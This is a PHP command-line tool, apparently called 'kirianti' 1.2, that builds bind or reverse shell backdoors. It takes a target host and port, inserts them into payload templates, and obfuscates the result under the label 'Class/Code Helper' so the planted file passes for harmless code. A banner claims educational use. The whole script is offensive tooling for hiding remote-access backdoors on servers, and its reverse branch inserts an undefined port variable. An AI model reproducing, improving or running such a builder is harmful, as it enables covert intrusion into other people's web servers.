<?php
include_once "obfuscator/src/Obfuscator.php";

$raw_bind = "src/entahlah.php";
$raw_reverse = "src/lulz.php";
$output_dir = "./output/";
$cli = php_sapi_name() === "cli";
if(!$cli){
	echo "<center>This Project is Supposed For Cli Usage</center>";
	exit(-1);
}

welcome();

$output = null;
do {
	$line   = trim(readline("[?] Whats your output filename:"));
	$output = str_replace(array("\n", "\r"), "", $line);
	if(strlen($output) == 0){
		$output = null;
	}
} while($output == null);

$kindback = null;
do {
	$line     = trim(readline("[?] What kind of your backdoor [bind|reverse]:"));
	$kindback = str_replace(array("\n", "\r"), "", $line);
	if(strlen($kindback) == 0 || !preg_match("/bind|reverse/", $kindback)){
		$kindback = null;
	}
} while($kindback == null);
if($kindback == "bind"){
	$mintainput = null;
	do {
		$line       = trim(readline("[?] Whats your target's ip/hostname (dont use http://):"));
		$mintainput = str_replace(array("\n", "\r"), "", $line);
		if(preg_match("/http:\/\//", $mintainput) || strlen($mintainput) == 0){
			$mintainput = null;
		}
	} while($mintainput == null);
	$mintaport = null;
	do {
		$line = trim(readline("[?] Whats your random port (must 4 digit):"));
		$mintaport = str_replace(array("\n", "\r"), "", $line);
		$mintaport = (int)$mintaport;
		if((strlen($mintaport) == 0) || (strlen($mintaport) != 4)){
			$mintaport = null;
		}
	} while($mintaport == null);
	
	$xdata = file_get_contents($raw_bind);
	$xdata = str_replace("[HOSTNAME_GOES_HERE]", $mintainput, $xdata);
	$xdata = str_replace("[PORT_GOES_HERE]", $mintaport, $xdata);
	
	$agent = $output_dir . $output;
	$agent_data = str_replace(array("<?php", "<?", "?>"), "", $xdata);
	$obfs_data = new Obfuscator($agent_data, "Class/Code Helper");
	file_put_contents($agent, "<?php" . "\r\n" . $obfs_data);
}
elseif($kindback == "reverse"){
	$mintaport2 = null;
	do {
		$line = trim(readline("[?] Whats your random port (must 4 digit):"));
		$mintaport2 = str_replace(array("\n", "\r"), "", $line);
		$mintaport2 = (int)$mintaport2;
		if((strlen($mintaport2) == 0) || (strlen($mintaport2) != 4)){
			$mintaport2 = null;
		}
	} while($mintaport2 == null);
	
	$xdata = file_get_contents($raw_reverse);
	$xdata = str_replace("[PORT_GOES_HERE]", $mintaport, $xdata);
	
	$agent = $output_dir . $output;
	$agent_data = str_replace(array("<?php", "<?", "?>"), "", $xdata);
	$obfs_data = new Obfuscator($agent_data, "Class/Code Helper");
	file_put_contents($agent, "<?php" . "\r\n" . $obfs_data);
}
echo "[*] Information [*]\n";
echo "[i] Output Filename: $output\n";
echo "[i] Backdoor Type: $kindback\n";
if($kindback == "bind"){ 
	echo "[i] Target Hostname/Ip: $mintainput\n";
	echo "[i] Port: $mintaport\n";
}
elseif($kindback == "reverse"){
	echo "[i] Port: $mintaport2\n";
}
echo "\n[!] Done. Just open the output folder.\n";

function welcome(){
	print <<<WAH
                          _
 _     _                 | |  _
| | __(_)_ __  __ _ _ __ | |_(_)
| |/ /| | '__|/ _` | '_ \| __| |
|   < | | |  | (_| | | | | |_| |
|_|\_\|_|_|   \__,_|_| |_|\__|_|
                    Version: 1.2

Author: ./MyHeartIsyr
Blog: https://myheart-isyr.blogspot.com

+-[WARNING]------------------------------+
| FOR EDUCATION & NON-COMMERCIAL PURPOSE |
| I'M NOT RESPONSIBLE FOR ANY MISUSED OF |
|             THIS PROJECT               |
+----------------------------------------+

WAH;
}